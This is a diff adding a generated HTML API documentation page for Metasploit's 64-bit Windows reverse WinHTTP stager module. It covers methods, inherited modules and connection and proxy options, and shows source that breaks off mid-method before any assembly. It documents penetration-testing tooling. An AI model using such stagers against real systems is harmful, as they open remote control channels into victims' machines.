@@ -1,0 +1,1961 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>
+  Module: Msf::Payload::Windows::ReverseWinHttp_x64
+  
+    &mdash; Documentation by YARD 0.9.26
+  
+</title>
+
+  <link rel="stylesheet" href="../../../css/style.css" type="text/css" />
+
+  <link rel="stylesheet" href="../../../css/common.css" type="text/css" />
+
+<script type="text/javascript">
+  pathId = "Msf::Payload::Windows::ReverseWinHttp_x64";
+  relpath = '../../../';
+</script>
+
+
+  <script type="text/javascript" charset="utf-8" src="../../../js/jquery.js"></script>
+
+  <script type="text/javascript" charset="utf-8" src="../../../js/app.js"></script>
+
+
+  </head>
+  <body>
+    <div class="nav_wrap">
+      <iframe id="nav" src="../../../class_list.html?1"></iframe>
+      <div id="resizer"></div>
+    </div>
+
+    <div id="main" tabindex="-1">
+      <div id="header">
+        <div id="menu">
+  
+    <a href="../../../_index.html">Index (R)</a> &raquo;
+    <span class='title'><span class='object_link'><a href="../../../Msf.html" title="Msf (module)">Msf</a></span></span> &raquo; <span class='title'><span class='object_link'><a href="../../Payload.html" title="Msf::Payload (class)">Payload</a></span></span> &raquo; <span class='title'><span class='object_link'><a href="../Windows.html" title="Msf::Payload::Windows (module)">Windows</a></span></span>
+     &raquo; 
+    <span class="title">ReverseWinHttp_x64</span>
+  
+</div>
+
+        <div id="search">
+  
+    <a class="full_list_link" id="class_list_link"
+        href="../../../class_list.html">
+
+        <svg width="24" height="24">
+          <rect x="0" y="4" width="24" height="4" rx="1" ry="1"></rect>
+          <rect x="0" y="12" width="24" height="4" rx="1" ry="1"></rect>
+          <rect x="0" y="20" width="24" height="4" rx="1" ry="1"></rect>
+        </svg>
+    </a>
+  
+</div>
+        <div class="clear"></div>
+      </div>
+
+      <div id="content"><h1>Module: Msf::Payload::Windows::ReverseWinHttp_x64
+  
+  
+  
+</h1>
+<div class="box_info">
+  
+
+  
+  
+  
+  
+  <dl>
+      <dt>Includes:</dt>
+      <dd><span class='object_link'><a href="ReverseHttp_x64.html" title="Msf::Payload::Windows::ReverseHttp_x64 (module)">ReverseHttp_x64</a></span></dd>
+  </dl>
+  
+  
+
+  
+  <dl>
+    <dt>Included in:</dt>
+    <dd><span class='object_link'><a href="ReverseWinHttps_x64.html" title="Msf::Payload::Windows::ReverseWinHttps_x64 (module)">ReverseWinHttps_x64</a></span></dd>
+  </dl>
+  
+
+  
+  <dl>
+    <dt>Defined in:</dt>
+    <dd>lib/msf/core/payload/windows/x64/reverse_win_http_x64.rb</dd>
+  </dl>
+  
+</div>
+
+<h2>Overview</h2><div class="docstring">
+  <div class="discussion">
+    
+<p>Complex payload generation for Windows ARCH_X86 that speak HTTP(S) using WinHTTP</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+
+</div>
+
+
+  <h2>Constant Summary</h2>
+  
+  <h3 class="inherited">Constants included
+     from <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html" title="Rex::Payloads::Meterpreter::UriChecksum (module)">Rex::Payloads::Meterpreter::UriChecksum</a></span></h3>
+  <p class="inherited"><span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#URI_CHECKSUM_CONN-constant" title="Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_CONN (constant)">Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_CONN</a></span>, <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#URI_CHECKSUM_CONN_MAX_LEN-constant" title="Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_CONN_MAX_LEN (constant)">Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_CONN_MAX_LEN</a></span>, <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#URI_CHECKSUM_INITJ-constant" title="Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_INITJ (constant)">Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_INITJ</a></span>, <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#URI_CHECKSUM_INITN-constant" title="Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_INITN (constant)">Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_INITN</a></span>, <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#URI_CHECKSUM_INITP-constant" title="Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_INITP (constant)">Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_INITP</a></span>, <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#URI_CHECKSUM_INITW-constant" title="Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_INITW (constant)">Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_INITW</a></span>, <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#URI_CHECKSUM_INIT_CONN-constant" title="Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_INIT_CONN (constant)">Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_INIT_CONN</a></span>, <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#URI_CHECKSUM_MIN_LEN-constant" title="Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_MIN_LEN (constant)">Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_MIN_LEN</a></span>, <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#URI_CHECKSUM_MODES-constant" title="Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_MODES (constant)">Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_MODES</a></span>, <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#URI_CHECKSUM_UUID_MIN_LEN-constant" title="Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_UUID_MIN_LEN (constant)">Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_UUID_MIN_LEN</a></span></p>
+
+
+
+
+
+  
+    <h2>
+      Instance Method Summary
+      <small><a href="#" class="summary_toggle">collapse</a></small>
+    </h2>
+
+    <ul class="summary">
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#asm_generate_wchar_array-instance_method" title="#asm_generate_wchar_array (instance method)">#<strong>asm_generate_wchar_array</strong>(str)  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Convert a string into a NULL-terminated wchar byte array.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#asm_reverse_winhttp-instance_method" title="#asm_reverse_winhttp (instance method)">#<strong>asm_reverse_winhttp</strong>(opts = {})  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Generate an assembly stub with the configured feature set and options.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#generate-instance_method" title="#generate (instance method)">#<strong>generate</strong>(opts = {})  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Generate the first stage.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#generate_reverse_winhttp-instance_method" title="#generate_reverse_winhttp (instance method)">#<strong>generate_reverse_winhttp</strong>(opts = {})  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Generate and compile the stager.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#initialize-instance_method" title="#initialize (instance method)">#<strong>initialize</strong>(*args)  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Register reverse_winhttp specific options.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#required_space-instance_method" title="#required_space (instance method)">#<strong>required_space</strong>  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Determine the maximum amount of space required for the features requested.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#transport_config-instance_method" title="#transport_config (instance method)">#<strong>transport_config</strong>(opts = {})  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+    </ul>
+  
+
+
+  
+  
+  
+  
+  
+  
+  
+  
+  <h3 class="inherited">Methods included from <span class='object_link'><a href="ReverseHttp_x64.html" title="Msf::Payload::Windows::ReverseHttp_x64 (module)">ReverseHttp_x64</a></span></h3>
+  <p class="inherited"><span class='object_link'><a href="ReverseHttp_x64.html#asm_generate_ascii_array-instance_method" title="Msf::Payload::Windows::ReverseHttp_x64#asm_generate_ascii_array (method)">#asm_generate_ascii_array</a></span>, <span class='object_link'><a href="ReverseHttp_x64.html#asm_reverse_http-instance_method" title="Msf::Payload::Windows::ReverseHttp_x64#asm_reverse_http (method)">#asm_reverse_http</a></span>, <span class='object_link'><a href="ReverseHttp_x64.html#generate_reverse_http-instance_method" title="Msf::Payload::Windows::ReverseHttp_x64#generate_reverse_http (method)">#generate_reverse_http</a></span>, <span class='object_link'><a href="ReverseHttp_x64.html#generate_small_uri-instance_method" title="Msf::Payload::Windows::ReverseHttp_x64#generate_small_uri (method)">#generate_small_uri</a></span>, <span class='object_link'><a href="ReverseHttp_x64.html#generate_uri-instance_method" title="Msf::Payload::Windows::ReverseHttp_x64#generate_uri (method)">#generate_uri</a></span>, <span class='object_link'><a href="ReverseHttp_x64.html#get_custom_headers-instance_method" title="Msf::Payload::Windows::ReverseHttp_x64#get_custom_headers (method)">#get_custom_headers</a></span>, <span class='object_link'><a href="ReverseHttp_x64.html#stage_over_connection%3F-instance_method" title="Msf::Payload::Windows::ReverseHttp_x64#stage_over_connection? (method)">#stage_over_connection?</a></span>, <span class='object_link'><a href="ReverseHttp_x64.html#wfs_delay-instance_method" title="Msf::Payload::Windows::ReverseHttp_x64#wfs_delay (method)">#wfs_delay</a></span></p>
+
+  
+  
+  
+  
+  
+  
+  
+  
+  <h3 class="inherited">Methods included from <span class='object_link'><a href="../UUID/Options.html" title="Msf::Payload::UUID::Options (module)">UUID::Options</a></span></h3>
+  <p class="inherited"><span class='object_link'><a href="../UUID/Options.html#generate_payload_uuid-instance_method" title="Msf::Payload::UUID::Options#generate_payload_uuid (method)">#generate_payload_uuid</a></span>, <span class='object_link'><a href="../UUID/Options.html#generate_uri_uuid_mode-instance_method" title="Msf::Payload::UUID::Options#generate_uri_uuid_mode (method)">#generate_uri_uuid_mode</a></span>, <span class='object_link'><a href="../UUID/Options.html#record_payload_uuid-instance_method" title="Msf::Payload::UUID::Options#record_payload_uuid (method)">#record_payload_uuid</a></span>, <span class='object_link'><a href="../UUID/Options.html#record_payload_uuid_url-instance_method" title="Msf::Payload::UUID::Options#record_payload_uuid_url (method)">#record_payload_uuid_url</a></span></p>
+
+  
+  
+  
+  
+  
+  
+  
+  
+  <h3 class="inherited">Methods included from <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html" title="Rex::Payloads::Meterpreter::UriChecksum (module)">Rex::Payloads::Meterpreter::UriChecksum</a></span></h3>
+  <p class="inherited"><span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#generate_uri_checksum-instance_method" title="Rex::Payloads::Meterpreter::UriChecksum#generate_uri_checksum (method)">#generate_uri_checksum</a></span>, <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#generate_uri_uuid-instance_method" title="Rex::Payloads::Meterpreter::UriChecksum#generate_uri_uuid (method)">#generate_uri_uuid</a></span>, <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#process_uri_resource-instance_method" title="Rex::Payloads::Meterpreter::UriChecksum#process_uri_resource (method)">#process_uri_resource</a></span>, <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#uri_checksum_lookup-instance_method" title="Rex::Payloads::Meterpreter::UriChecksum#uri_checksum_lookup (method)">#uri_checksum_lookup</a></span></p>
+
+  
+  
+  
+  
+  
+  
+  
+  
+  <h3 class="inherited">Methods included from <span class='object_link'><a href="Exitfunk_x64.html" title="Msf::Payload::Windows::Exitfunk_x64 (module)">Exitfunk_x64</a></span></h3>
+  <p class="inherited"><span class='object_link'><a href="Exitfunk_x64.html#asm_exitfunk-instance_method" title="Msf::Payload::Windows::Exitfunk_x64#asm_exitfunk (method)">#asm_exitfunk</a></span></p>
+
+  
+  
+  
+  
+  
+  
+  
+  
+  <h3 class="inherited">Methods included from <span class='object_link'><a href="BlockApi_x64.html" title="Msf::Payload::Windows::BlockApi_x64 (module)">BlockApi_x64</a></span></h3>
+  <p class="inherited"><span class='object_link'><a href="BlockApi_x64.html#asm_block_api-instance_method" title="Msf::Payload::Windows::BlockApi_x64#asm_block_api (method)">#asm_block_api</a></span></p>
+
+  
+  
+  
+  
+  
+  
+  
+  
+  <h3 class="inherited">Methods included from <span class='object_link'><a href="../Windows.html" title="Msf::Payload::Windows (module)">Msf::Payload::Windows</a></span></h3>
+  <p class="inherited"><span class='object_link'><a href="../Windows.html#apply_prepends-instance_method" title="Msf::Payload::Windows#apply_prepends (method)">#apply_prepends</a></span>, <span class='object_link'><a href="../Windows.html#exit_types-class_method" title="Msf::Payload::Windows.exit_types (method)">exit_types</a></span>, <span class='object_link'><a href="../Windows.html#handle_intermediate_stage-instance_method" title="Msf::Payload::Windows#handle_intermediate_stage (method)">#handle_intermediate_stage</a></span>, <span class='object_link'><a href="../Windows.html#include_send_uuid-instance_method" title="Msf::Payload::Windows#include_send_uuid (method)">#include_send_uuid</a></span>, <span class='object_link'><a href="../Windows.html#replace_var-instance_method" title="Msf::Payload::Windows#replace_var (method)">#replace_var</a></span></p>
+
+  
+  
+  
+  
+  
+  
+  
+  
+  <h3 class="inherited">Methods included from <span class='object_link'><a href="PrependMigrate.html" title="Msf::Payload::Windows::PrependMigrate (module)">PrependMigrate</a></span></h3>
+  <p class="inherited"><span class='object_link'><a href="PrependMigrate.html#apply_prepend_migrate-instance_method" title="Msf::Payload::Windows::PrependMigrate#apply_prepend_migrate (method)">#apply_prepend_migrate</a></span>, <span class='object_link'><a href="PrependMigrate.html#prepend_migrate-instance_method" title="Msf::Payload::Windows::PrependMigrate#prepend_migrate (method)">#prepend_migrate</a></span>, <span class='object_link'><a href="PrependMigrate.html#prepend_migrate%3F-instance_method" title="Msf::Payload::Windows::PrependMigrate#prepend_migrate? (method)">#prepend_migrate?</a></span>, <span class='object_link'><a href="PrependMigrate.html#prepend_migrate_64-instance_method" title="Msf::Payload::Windows::PrependMigrate#prepend_migrate_64 (method)">#prepend_migrate_64</a></span></p>
+
+  
+  
+  
+  
+  
+  
+  
+  
+  <h3 class="inherited">Methods included from <span class='object_link'><a href="../TransportConfig.html" title="Msf::Payload::TransportConfig (module)">TransportConfig</a></span></h3>
+  <p class="inherited"><span class='object_link'><a href="../TransportConfig.html#transport_config_bind_named_pipe-instance_method" title="Msf::Payload::TransportConfig#transport_config_bind_named_pipe (method)">#transport_config_bind_named_pipe</a></span>, <span class='object_link'><a href="../TransportConfig.html#transport_config_bind_tcp-instance_method" title="Msf::Payload::TransportConfig#transport_config_bind_tcp (method)">#transport_config_bind_tcp</a></span>, <span class='object_link'><a href="../TransportConfig.html#transport_config_reverse_http-instance_method" title="Msf::Payload::TransportConfig#transport_config_reverse_http (method)">#transport_config_reverse_http</a></span>, <span class='object_link'><a href="../TransportConfig.html#transport_config_reverse_https-instance_method" title="Msf::Payload::TransportConfig#transport_config_reverse_https (method)">#transport_config_reverse_https</a></span>, <span class='object_link'><a href="../TransportConfig.html#transport_config_reverse_ipv6_tcp-instance_method" title="Msf::Payload::TransportConfig#transport_config_reverse_ipv6_tcp (method)">#transport_config_reverse_ipv6_tcp</a></span>, <span class='object_link'><a href="../TransportConfig.html#transport_config_reverse_named_pipe-instance_method" title="Msf::Payload::TransportConfig#transport_config_reverse_named_pipe (method)">#transport_config_reverse_named_pipe</a></span>, <span class='object_link'><a href="../TransportConfig.html#transport_config_reverse_tcp-instance_method" title="Msf::Payload::TransportConfig#transport_config_reverse_tcp (method)">#transport_config_reverse_tcp</a></span>, <span class='object_link'><a href="../TransportConfig.html#transport_config_reverse_udp-instance_method" title="Msf::Payload::TransportConfig#transport_config_reverse_udp (method)">#transport_config_reverse_udp</a></span>, <span class='object_link'><a href="../TransportConfig.html#transport_uri_components-instance_method" title="Msf::Payload::TransportConfig#transport_uri_components (method)">#transport_uri_components</a></span></p>
+
+  
+  
+  
+  
+  
+  
+
+  <div id="instance_method_details" class="method_details_list">
+    <h2>Instance Method Details</h2>
+
+    
+      <div class="method_details first">
+  <h3 class="signature first" id="asm_generate_wchar_array-instance_method">
+  
+    #<strong>asm_generate_wchar_array</strong>(str)  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Convert a string into a NULL-terminated wchar byte array</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+107
+108
+109
+110
+111
+112
+113
+114</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/x64/reverse_win_http_x64.rb', line 107</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_asm_generate_wchar_array'>asm_generate_wchar_array</span><span class='lparen'>(</span><span class='id identifier rubyid_str'>str</span><span class='rparen'>)</span>
+  <span class='lparen'>(</span><span class='id identifier rubyid_str'>str</span><span class='period'>.</span><span class='id identifier rubyid_to_s'>to_s</span> <span class='op'>+</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x00</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span><span class='period'>.</span>
+    <span class='id identifier rubyid_unpack'>unpack</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>C*</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span><span class='period'>.</span>
+    <span class='id identifier rubyid_pack'>pack</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>v*</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span><span class='period'>.</span>
+    <span class='id identifier rubyid_unpack'>unpack</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>C*</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span><span class='period'>.</span>
+    <span class='id identifier rubyid_map'>map</span><span class='lbrace'>{</span> <span class='op'>|</span><span class='id identifier rubyid_c'>c</span><span class='op'>|</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>0x%.2x</span><span class='tstring_end'>&quot;</span></span> <span class='op'>%</span> <span class='id identifier rubyid_c'>c</span> <span class='rbrace'>}</span><span class='period'>.</span>
+    <span class='id identifier rubyid_join'><span class='object_link'><a href="../../../top-level-namespace.html#join-instance_method" title="#join (method)">join</a></span></span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>,</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="asm_reverse_winhttp-instance_method">
+  
+    #<strong>asm_reverse_winhttp</strong>(opts = {})  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Generate an assembly stub with the configured feature set and options.</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  <p class="tag_title">Parameters:</p>
+<ul class="param">
+  
+    <li>
+      
+        <span class='name'>opts</span>
+      
+      
+        <span class='type'>(<tt>Hash</tt>)</span>
+      
+      
+        <em class="default">(defaults to: <tt>{}</tt>)</em>
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>a customizable set of options</p>
+</div>
+      
+    </li>
+  
+</ul>
+
+  
+    
+    
+    <p class="tag_title">Options Hash (<tt>opts</tt>):</p>
+    <ul class="option">
+      
+        <li>
+          <span class="name">:ssl</span>
+          <span class="type">(<tt>Bool</tt>)</span>
+          <span class="default">
+            
+          </span>
+          
+            &mdash; <div class='inline'>
+<p>Whether or not to enable SSL</p>
+</div>
+          
+        </li>
+      
+        <li>
+          <span class="name">:url</span>
+          <span class="type">(<tt>String</tt>)</span>
+          <span class="default">
+            
+          </span>
+          
+            &mdash; <div class='inline'>
+<p>The URI to request during staging</p>
+</div>
+          
+        </li>
+      
+        <li>
+          <span class="name">:host</span>
+          <span class="type">(<tt>String</tt>)</span>
+          <span class="default">
+            
+          </span>
+          
+            &mdash; <div class='inline'>
+<p>The host to connect to</p>
+</div>
+          
+        </li>
+      
+        <li>
+          <span class="name">:port</span>
+          <span class="type">(<tt>Integer</tt>)</span>
+          <span class="default">
+            
+          </span>
+          
+            &mdash; <div class='inline'>
+<p>The port to connect to</p>
+</div>
+          
+        </li>
+      
+        <li>
+          <span class="name">:exitfunk</span>
+          <span class="type">(<tt>String</tt>)</span>
+          <span class="default">
+            
+          </span>
+          
+            &mdash; <div class='inline'>
+<p>The exit method to use if there is an error, one of process, thread, or seh</p>
+</div>
+          
+        </li>
+      
+        <li>
+          <span class="name">:proxy_host</span>
+          <span class="type">(<tt>String</tt>)</span>
+          <span class="default">
+            
+          </span>
+          
+            &mdash; <div class='inline'>
+<p>The optional proxy server host to use</p>
+</div>
+          
+        </li>
+      
+        <li>
+          <span class="name">:proxy_port</span>
+          <span class="type">(<tt>Integer</tt>)</span>
+          <span class="default">
+            
+          </span>
+          
+            &mdash; <div class='inline'>
+<p>The optional proxy server port to use</p>
+</div>
+          
+        </li>
+      
+        <li>
+          <span class="name">:proxy_type</span>
+          <span class="type">(<tt>String</tt>)</span>
+          <span class="default">
+            
+          </span>
+          
+            &mdash; <div class='inline'>
+<p>The optional proxy server type, one of HTTP or SOCKS</p>
+</div>
+          
+        </li>
+      
+        <li>
+          <span class="name">:proxy_user</span>
+          <span class="type">(<tt>String</tt>)</span>
+          <span class="default">
+            
+          </span>
+          
+            &mdash; <div class='inline'>
+<p>The optional proxy server username</p>
+</div>
+          
+        </li>
+      
+        <li>
+          <span class="name">:proxy_pass</span>
+          <span class="type">(<tt>String</tt>)</span>
+          <span class="default">
+            
+          </span>
+          
+            &mdash; <div class='inline'>
+<p>The optional proxy server password</p>
+</div>
+          
+        </li>
+      
+        <li>
+          <span class="name">:custom_headers</span>
+          <span class="type">(<tt>String</tt>)</span>
+          <span class="default">
+            
+          </span>
+          
+            &mdash; <div class='inline'>
+<p>The optional collection of custom headers for the payload.</p>
+</div>
+          
+        </li>
+      
+        <li>
+          <span class="name">:retry_count</span>
+          <span class="type">(<tt>Integer</tt>)</span>
+          <span class="default">
+            
+          </span>
+          
+            &mdash; <div class='inline'>
+<p>The number of times to retry a failed request before giving up</p>
+</div>
+          
+        </li>
+      
+        <li>
+          <span class="name">:retry_wait</span>
+          <span class="type">(<tt>Integer</tt>)</span>
+          <span class="default">
+            
+          </span>
+          
+            &mdash; <div class='inline'>
+<p>The seconds to wait before retry a new request</p>
+</div>
+          
+        </li>
+      
+    </ul>
+  
+
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+133
+134
+135
+136
+137
+138
+139
+140
+141
+142
+143
+144
+145
+146
+147
+148
+149
+150
+151
+152
+153
+154
+155
+156
+157
+158
+159
+160
+161
+162
+163
+164
+165
+166
+167
+168
+169
+170
+171
+172
+173
+174
+175
+176
+177
+178
+179
+180
+181
+182
+183
+184
+185
+186
+187
+188
+189
+190
+191
+192
+193
+194
+195
+196
+197
+198
+199
+200
+201
+202
+203
+204
+205
+206
+207
+208
+209
+210
+211
+212
+213
+214
+215
+216
+217
+218
+219
+220
+221
+222
+223
+224
+225
+226
+227
+228
+229
+230
+231
+232
+233
+234
+235
+236
+237
+238
+239
+240
+241
+242
+243
+244
+245
+246
+247
+248
+249
+250
+251
+252
+253
+254
+255
+256
+257
+258
+259
+260
+261
+262
+263
+264
+265
+266
+267
+268
+269
+270
+271
+272
+273
+274
+275
+276
+277
+278
+279
+280
+281
+282
+283
+284
+285
+286
+287
+288
+289
+290
+291
+292
+293
+294
+295
+296
+297
+298
+299
+300
+301
+302
+303
+304
+305
+306
+307
+308
+309
+310
+311
+312
+313
+314
+315
+316
+317
+318
+319
+320
+321
+322
+323
+324
+325
+326
+327
+328
+329
+330
+331
+332
+333
+334
+335
+336
+337
+338
+339
+340
+341
+342
+343
+344
+345
+346
+347
+348
+349
+350
+351
+352
+353
+354
+355
+356
+357
+358
+359
+360
+361
+362
+363
+364
+365
+366
+367
+368
+369
+370
+371
+372
+373
+374
+375
+376
+377
+378
+379
+380
+381
+382
+383
+384
+385
+386
+387
+388
+389
+390
+391
+392
+393
+394
+395
+396
+397
+398
+399
+400
+401
+402
+403
+404
+405
+406
+407
+408
+409
+410
+411
+412
+413
+414
+415
+416
+417
+418
+419
+420
+421
+422
+423
+424
+425
+426
+427
+428
+429
+430
+431
+432
+433
+434
+435
+436
+437
+438
+439
+440
+441
+442
+443
+444
+445
+446
+447
+448
+449
+450
+451
+452
+453
+454
+455
+456
+457
+458
+459
+460
+461
+462
+463
+464
+465
+466
+467
+468
+469
+470
+471
+472
+473
+474
+475
+476
+477
+478
+479
+480
+481
+482
+483
+484
+485
+486
+487
+488
+489
+490
+491
+492
+493
+494
+495
+496
+497
+498
+499
+500
+501
+502
+503
+504
+505
+506
+507
+508
+509
+510
+511
+512
+513
+514
+515
+516
+517
+518
+519
+520
+521
+522
+523
+524
+525
+526
+527
+528
+529
+530
+531
+532
+533
+534
+535
+536
+537
+538
+539
+540
+541
+542
+543
+544
+545
+546
+547
+548
+549
+550
+551
+552
+553
+554
+555
+556
+557
+558
+559
+560
+561
+562
+563
+564
+565
+566
+567
+568
+569
+570
+571
+572
+573
+574
+575
+576
+577
+578
+579
+580
+581
+582
+583
+584
+585
+586
+587
+588
+589
+590
+591
+592
+593
+594
+595
+596
+597
+598
+599
+600
+601
+602
+603
+604
+605
+606
+607
+608
+609
+610
+611
+612</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/x64/reverse_win_http_x64.rb', line 133</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_asm_reverse_winhttp'>asm_reverse_winhttp</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='op'>=</span><span class='lbrace'>{</span><span class='rbrace'>}</span><span class='rparen'>)</span>
+
+  <span class='id identifier rubyid_retry_count'>retry_count</span>       <span class='op'>=</span> <span class='lbracket'>[</span><span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:retry_count</span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_to_i'>to_i</span><span class='comma'>,</span> <span class='int'>1</span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_max'>max</span>
+  <span class='id identifier rubyid_verify_ssl'>verify_ssl</span>        <span class='op'>=</span> <span class='kw'>nil</span>
+  <span class='id identifier rubyid_encoded_cert_hash'>encoded_cert_hash</span> <span class='op'>=</span> <span class='kw'>nil</span>
+  <span class='id identifier rubyid_encoded_uri'>encoded_uri</span>       <span class='op'>=</span> <span class='id identifier rubyid_asm_generate_wchar_array'>asm_generate_wchar_array</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:uri</span><span class='rbracket'>]</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_encoded_host'>encoded_host</span>      <span class='op'>=</span> <span class='id identifier rubyid_asm_generate_wchar_array'>asm_generate_wchar_array</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:host</span><span class='rbracket'>]</span><span class='rparen'>)</span>
+
+  <span class='comment'># this is used by the IE proxy functionality when an autoconfiguration URL
+</span>  <span class='comment'># is specified. We need the full URL otherwise the call to resolve the proxy
+</span>  <span class='comment'># for the URL doesn&#39;t work.
+</span>  <span class='id identifier rubyid_full_url'>full_url</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>http</span><span class='tstring_end'>&#39;</span></span>
+  <span class='id identifier rubyid_full_url'>full_url</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>s</span><span class='tstring_end'>&#39;</span></span> <span class='kw'>if</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:ssl</span><span class='rbracket'>]</span>
